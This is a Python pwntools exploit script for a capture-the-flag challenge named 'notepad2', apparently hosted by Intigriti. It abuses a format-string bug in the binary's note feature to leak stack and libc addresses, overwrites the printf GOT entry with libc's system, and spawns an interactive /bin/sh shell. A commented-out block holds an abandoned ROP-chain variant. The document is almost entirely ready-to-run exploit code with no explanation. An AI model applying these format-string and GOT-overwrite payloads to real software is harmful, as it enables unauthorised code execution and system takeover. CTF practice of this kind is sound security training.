from pwn import *
from icecream import ic

elf = exe = ELF("./notepad2_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("notepad2.ctf.intigriti.io", 1342)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *0x00000000004015e6
b *0x404040
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a, drop=True)
def rl(): return io.recvline()
def uu64(a): return u64(re(a).ljust(8, b"\x00"))
def gad(a, b): return ROP(a).find_gadget(b)[0]
def qgad(a, b): return ROP(a).find_gadget([f"pop " + b, "ret"])[0]
def binsh(a): return next(a.search(b"/bin/sh\x00"))
def i(): return io.interactive()

io = start()

def alloc(ind, data):
    sla(">", "1")
    sla(">", str(ind))
    sla(">", data)

def view(ind):
    sla(">", "2")
    sla(">", str(ind))

def free(ind):
    sla(">", "3")
    sla(">", str(ind))

def formatstring(data):
    alloc(0, data)
    view(0)
    free(0)

alloc(0, "%14$p.%13$p")
view(0)
stack = int(ru(".").strip(), 16) - 0x100 + 8 + 0x10
lsb = stack & 0xffff
libc.address = int(rl().strip(), 16) - 0x28150
ic(hex(stack))
free(0)

alloc(0, f'%{lsb}c%14$hn')
view(0)
free(0)
'''
payload = p64(gad(libc, ["add rsp, 8", "ret"]))
payload += p64(qgad(libc, "rdi"))
payload += p64(binsh(libc))
payload += p64(gad(elf, ["ret"]))
payload += p64(libc.sym['system'])
count = 0
for i in range(len(payload)):
    if count == 7:
        lsb += 8
        count += 1
    if payload[i] == 0:
        lsb += 1
        formatstring(f'%44$hhn')
        formatstring(f'%{lsb}c%14$hn')
        count += 1
    else:
        lsb += 1
        formatstring(f'%{payload[i]}c%44$hhn')
        formatstring(f'%{lsb}c%14$hn')
        count += 1
'''

formatstring(f'%{elf.got['printf']}c%44$n')
formatstring(f'%{elf.got['printf']+2}c%40$n')
x = int(hex((libc.sym['system']))[-6:-4], 16)
y = int(hex((libc.sym['system']))[-4:], 16)
alloc(0, f'%{x}c%46$hhn%{y-x}c%15$hn')
view(0)

sl(b'1')
sl(b'1')
sl(b'/bin/sh\x00')

sl(b'2')
sl(b'1')
# formatstring(f'')
io.interactive()
